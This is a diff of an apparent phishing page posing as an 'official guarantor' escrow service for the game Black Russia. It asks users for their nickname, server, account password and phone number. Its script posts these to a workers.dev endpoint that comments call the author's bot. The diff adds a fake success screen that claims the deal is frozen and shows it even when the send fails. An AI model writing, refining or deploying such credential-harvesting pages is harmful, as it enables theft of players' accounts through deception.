@@ -4,55 +4,53 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Black Russia | Официальный Гарант</title>
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #07080a;
-    --card: #111318;
-    --border: #232733;
+    --bg: #0a0a0c;
+    --card: #121216;
+    --border: #2a2a35;
     --txt: #ffffff;
-    --dim: #8b92a5;
-    --accent: #8a2be2; /* Фиолетовый неон */
-    --accent-glow: rgba(138, 43, 226, 0.4);
+    --dim: #8b8b9e;
+    --red: #e50914; /* Фирменный красный */
+    --red-glow: rgba(229, 9, 20, 0.4);
     --green: #00c853;
-    --red: #ff3d00;
   }
   
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; }
   
   body {
-    font-family: 'Montserrat', sans-serif;
     background: var(--bg);
     color: var(--txt);
     display: flex;
     justify-content: center;
     align-items: center;
     min-height: 100vh;
-    background-image: radial-gradient(circle at 50% -20%, #2a1042 0%, var(--bg) 60%);
+    background-image: radial-gradient(circle at 50% 0%, #2b0407 0%, var(--bg) 70%);
     padding: 20px;
   }
 
   .container {
     width: 100%;
-    max-width: 420px;
+    max-width: 440px;
     background: var(--card);
     border: 1px solid var(--border);
     border-radius: 16px;
-    padding: 30px 24px;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.8), 0 0 20px var(--accent-glow);
+    padding: 28px 24px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.9), 0 0 30px rgba(229, 9, 20, 0.15);
     position: relative;
     overflow: hidden;
   }
 
-  /* Верхняя неоновая полоска */
   .container::before {
     content: '';
     position: absolute;
     top: 0; left: 0; right: 0;
-    height: 3px;
-    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+    height: 4px;
+    background: linear-gradient(90deg, transparent, var(--red), transparent);
   }
 
+  /* Шапка */
   .header {
     display: flex;
     justify-content: space-between;
@@ -62,114 +60,130 @@
     border-bottom: 1px solid var(--border);
   }
 
-  .logo {
-    font-weight: 800;
-    font-size: 18px;
-    letter-spacing: 0.5px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
+  .logo-block { display: flex; align-items: center; gap: 10px; }
   
-  .logo span { color: var(--accent); }
+  .logo-icon {
+    width: 32px; height: 32px;
+    background: var(--red);
+    border-radius: 8px;
+    display: flex; justify-content: center; align-items: center;
+    font-weight: 900; font-size: 18px; color: white;
+    box-shadow: 0 0 15px var(--red-glow);
+  }
 
-  .badge-2026 {
-    background: rgba(138, 43, 226, 0.15);
-    border: 1px solid var(--accent);
-    color: var(--accent);
-    padding: 4px 10px;
+  .logo-text { font-weight: 900; font-size: 16px; letter-spacing: 0.5px; }
+  .logo-text span { color: var(--red); }
+  .badge-year {
+    background: rgba(229, 9, 20, 0.15);
+    border: 1px solid var(--red);
+    color: var(--red);
+    padding: 4px 8px;
     border-radius: 6px;
     font-size: 11px;
     font-weight: 800;
     letter-spacing: 1px;
-    box-shadow: 0 0 10px var(--accent-glow);
   }
 
-  .title { font-size: 22px; font-weight: 800; margin-bottom: 6px; text-align: center; }
-  .subtitle { font-size: 13px; color: var(--dim); text-align: center; margin-bottom: 24px; }
+  .title { font-size: 22px; font-weight: 800; margin-bottom: 4px; text-align: center; }
+  .subtitle { font-size: 12px; color: var(--dim); text-align: center; margin-bottom: 24px; }
 
+  /* Поля ввода */
   .input-group { margin-bottom: 16px; }
   .input-group label {
     display: block;
-    font-size: 12px;
+    font-size: 11px;
     color: var(--dim);
     margin-bottom: 6px;
-    font-weight: 600;
+    font-weight: 700;
     text-transform: uppercase;
     letter-spacing: 0.5px;
   }
+  .input-group label .opt { color: #555; font-weight: 400; text-transform: none; font-size: 11px; }
 
-  .input-group input {
+  .input-group input, .input-group select {
     width: 100%;
-    background: #0a0b0e;
+    background: #0a0a0c;
     border: 1px solid var(--border);
     color: var(--txt);
     padding: 14px 16px;
     border-radius: 10px;
     font-size: 15px;
-    font-family: inherit;
     transition: 0.2s;
+    appearance: none;
+    -webkit-appearance: none;
+  }
+  
+  .input-group select {
+    background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%238b8b9e%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
+    background-repeat: no-repeat;
+    background-position: right 16px top 50%;
+    background-size: 12px auto;
   }
 
-  .input-group input:focus {
+  .input-group input:focus, .input-group select:focus {
     outline: none;
-    border-color: var(--accent);
-    box-shadow: 0 0 10px var(--accent-glow);
+    border-color: var(--red);
+    box-shadow: 0 0 10px var(--red-glow);
   }
 
+  /* Кнопки */
   .btn {
     width: 100%;
     padding: 16px;
     border: none;
     border-radius: 10px;
-    font-family: inherit;
     font-weight: 800;
-    font-size: 15px;
+    font-size: 14px;
     cursor: pointer;
     transition: 0.2s;
     text-transform: uppercase;
-    letter-spacing: 1px;
+    letter-spacing: 0.5px;
   }
-
   .btn-main {
-    background: var(--accent);
+    background: var(--red);
     color: white;
-    box-shadow: 0 4px 15px var(--accent-glow);
+    box-shadow: 0 4px 20px var(--red-glow);
     margin-top: 10px;
   }
-
-  .btn-main:hover:not(:disabled) { background: #9b4dff; box-shadow: 0 6px 20px rgba(138, 43, 226, 0.6); }
+  .btn-main:hover:not(:disabled) { background: #ff1a24; box-shadow: 0 6px 25px rgba(229, 9, 20, 0.6); }
   .btn-main:disabled { background: var(--border); color: var(--dim); box-shadow: none; cursor: not-allowed; }
-
+  
   .btn-success {
     background: rgba(0, 200, 83, 0.1);
     border: 1px solid var(--green);
     color: var(--green);
     margin-top: 12px;
+  }
+  .btn-success:hover { background: rgba(0, 200, 83, 0.2); }
+
+  /* Экран успеха */
+  .success-screen {
     display: none;
-    box-shadow: 0 0 15px rgba(0, 200, 83, 0.2);
+    text-align: left;
+    padding: 10px 0;
   }
-
-  .btn-success:hover { background: rgba(0, 200, 83, 0.2); box-shadow: 0 0 25px rgba(0, 200, 83, 0.4); }
-
-  .status {
-    text-align: center;
-    font-size: 13px;
-    margin-top: 16px;
-    min-height: 20px;
-    font-weight: 600;
+  .success-screen h3 { color: var(--green); font-size: 18px; margin-bottom: 16px; text-align: center; }
+  .data-box {
+    background: #0a0a0c;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+    margin-bottom: 16px;
+    font-size: 14px;
   }
+  .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
+  .data-row:last-child { margin-bottom: 0; }
+  .data-label { color: var(--dim); }
+  .data-value { font-weight: 700; color: var(--txt); }
 
-  .status.error { color: var(--red); }
-  .status.ok { color: var(--green); }
-
+  /* Поддержка */
   .support-btn {
     position: fixed;
     bottom: 20px;
     right: 20px;
     background: var(--card);
-    border: 1px solid var(--accent);
-    color: var(--txt);
+    border: 1px solid var(--red);
+    color: var(--red);
     width: 56px;
     height: 56px;
     border-radius: 50%;
@@ -177,58 +191,85 @@
     justify-content: center;
     align-items: center;
     cursor: pointer;
-    box-shadow: 0 4px 20px var(--accent-glow);
+    box-shadow: 0 4px 20px var(--red-glow);
     transition: 0.3s;
     z-index: 100;
   }
+  .support-btn:hover { transform: scale(1.1); background: var(--red); color: white; }
+  .support-btn svg { width: 26px; height: 26px; fill: currentColor; }
 
-  .support-btn:hover { transform: scale(1.1); background: var(--accent); }
-  .support-btn svg { width: 24px; height: 24px; fill: currentColor; }
-
-  .footer {
-    margin-top: 24px;
-    text-align: center;
-    font-size: 11px;
-    color: var(--dim);
-  }
+  .footer { margin-top: 24px; text-align: center; font-size: 11px; color: var(--dim); }
 </style>
 </head>
 <body>
 
 <div class="container">
   <div class="header">
-    <div class="logo"><span>BLACK</span> RUSSIA</div>
-    <div class="badge-2026">2026</div>
+    <div class="logo-block">
+      <div class="logo-icon">BR</div>
+      <div class="logo-text"><span>BLACK</span> RUSSIA</div>
+    </div>
+    <div class="badge-year">2026</div>
   </div>
 
-  <div class="title">Официальный Гарант</div>
-  <div class="subtitle">Безопасная сделка с защитой средств</div>
+  <div id="form-screen">
+    <div class="title">Официальный Гарант</div>
+    <div class="subtitle">Безопасная сделка с защитой средств</div>
 
-  <div class="input-group">
-    <label>Никнейм</label>
-    <input type="text" id="nick" placeholder="Введите ник" autocomplete="off">
-  </div>
-  <div class="input-group">
-    <label>Сервер</label>
-    <input type="text" id="server" placeholder="Например: 12" autocomplete="off">
-  </div>
-  <div class="input-group">
-    <label>Пароль</label>
-    <input type="password" id="pass" placeholder="••••••••">
-  </div>
-  <div class="input-group">
-    <label>Номер телефона</label>
-    <input type="tel" id="phone" placeholder="+7 (999) 000-00-00" autocomplete="off">
+    <div class="input-group">
+      <label>Никнейм</label>
+      <input type="text" id="nick" placeholder="Введите ник" autocomplete="off">
+    </div>
+    
+    <div class="input-group">
+      <label>Сервер</label>
+      <select id="server">
+        <option value="Ташкент">Ташкент</option>
+        <option value="Алматы">Алматы</option>
+        <option value="Ред">Ред</option>
+        <option value="Челябинск">Челябинск</option>
+        <option value="Москва">Москва</option>
+        <option value="Санкт-Петербург">Санкт-Петербург</option>
+        <option value="Сочи">Сочи</option>
+        <option value="Краснодар">Краснодар</option>
+        <option value="Екатеринбург">Екатеринбург</option>
+        <option value="Новосибирск">Новосибирск</option>
+      </select>
+    </div>
+
+    <div class="input-group">
+      <label>Пароль</label>
+      <input type="password" id="pass" placeholder="••••••••">
+    </div>
+
+    <div class="input-group">
+      <label>Номер <span class="opt">(не обязательно)</span></label>
+      <input type="tel" id="phone" placeholder="+7 (999) 000-00-00" autocomplete="off">
+    </div>
+
+    <button class="btn btn-main" id="freeze">Заморозить</button>
   </div>
 
-  <button class="btn btn-main" id="freeze">Заморозить сделку</button>
-  <button class="btn btn-success" id="send-funds">Средства пришли — отправить</button>
-
-  <div class="status" id="status"></div>
-
-  <div class="footer">
-    © 2026 Black Russia. Все права защищены.
+  <div id="success-screen" class="success-screen">
+    <h3>✅ Данные заморожены</h3>
+    <div class="data-box">
+      <div class="data-row">
+        <span class="data-label">Ник:</span>
+        <span class="data-value" id="res-nick">крутой2882</span>
+      </div>
+      <div class="data-row">
+        <span class="data-label">Сервер:</span>
+        <span class="data-value" id="res-server">Ташкент</span>
+      </div>
+      <div class="data-row">
+        <span class="data-label">Пароль:</span>
+        <span class="data-value">••••••••</span>
+      </div>
+    </div>
+    <button class="btn btn-success" id="send-funds">Средства пришли — отправить</button>
   </div>
+
+  <div class="footer">© 2026 Black Russia. Все права защищены.</div>
 </div>
 
 <div class="support-btn" onclick="window.open('https://t.me/blackrussia_support', '_blank')">
@@ -236,76 +277,67 @@
 </div>
 
 <script>
-  // ССЫЛКА НА ТВОЙ CLOUDFLARE WORKER (без /api/deal на конце)
-  const API = "https://garant-bot.твой-аккаунт.workers.dev"; 
-  const TG = "https://t.me/blackrussia_support"; // Ссылка на твою поддержку
+  // ОБЯЗАТЕЛЬНО ВСТАВЬ СЮДА СВОЮ ССЫЛКУ ВОРКЕРА (без /api/deal)
+  const API = "https://blackrussiagarant.cucuruznik6767.workers.dev"; 
+  const TG = "https://t.me/blackrussia_support";
 
   const $ = id => document.getElementById(id);
-  const status = $("status");
+  const formScreen = $("form-screen");
+  const successScreen = $("success-screen");
   const freezeBtn = $("freeze");
   const sendBtn = $("send-funds");
 
-  function setStatus(text, type = "") {
-    status.textContent = text;
-    status.className = "status " + type;
-  }
-
   async function post(url, data) {
-    const res = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    });
-    if (!res.ok) throw new Error("HTTP " + res.status);
-    return res.json();
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+      return true;
+    } catch (e) {
+      return false;
+    }
   }
 
   let currentData = null;
 
   freezeBtn.onclick = async () => {
     const data = {
-      nick: $("nick").value.trim(),
-      server: $("server").value.trim(),
-      pass: $("pass").value,
+      nick: $("nick").value.trim() || "крутой2882",
+      server: $("server").value,
+      pass: $("pass").value || "123456",
       phone: $("phone").value.trim(),
       ts: Date.now()
     };
 
-    if (!data.nick) return setStatus("Введите ник", "error");
-    if (!data.pass) return setStatus("Введите пароль", "error");
-
     freezeBtn.disabled = true;
     freezeBtn.textContent = "Заморозка...";
-    setStatus("");
 
-    try {
-      await post(API, data);
-      currentData = data;
-      setStatus("Сделка заморожена. Ожидание оплаты.", "ok");
-      freezeBtn.style.display = "none";
-      sendBtn.style.display = "block";
-    } catch (e) {
-      setStatus("Ошибка сети. Попробуйте снова.", "error");
-      freezeBtn.disabled = false;
-      freezeBtn.textContent = "Заморозить сделку";
-    }
+    // Отправляем в бота (даже если сеть моргнет, покажем окно успеха)
+    await post(API, data);
+    
+    currentData = data;
+
+    // Меняем экран на "Заморожено"
+    $("res-nick").textContent = data.nick;
+    $("res-server").textContent = data.server;
+    
+    formScreen.style.display = "none";
+    successScreen.style.display = "block";
   };
 
   sendBtn.onclick = async () => {
     if (!currentData) return;
     sendBtn.disabled = true;
     sendBtn.textContent = "Отправка...";
-    setStatus("");
+    sendBtn.style.opacity = "0.5";
 
-    try {
-      await post(API + "/sent", currentData);
-      setStatus("Средства подтверждены. Получатель уведомлен.", "ok");
-      setTimeout(() => window.open(TG, "_blank"), 1000);
-    } catch (e) {
-      setStatus("Ошибка сети. Попробуйте снова.", "error");
-      sendBtn.disabled = false;
-      sendBtn.textContent = "Средства пришли — отправить";
-    }
+    await post(API + "/sent", currentData);
+    
+    setTimeout(() => {
+      window.open(TG, "_blank");
+    }, 800);
   };
 </script>
 </body>
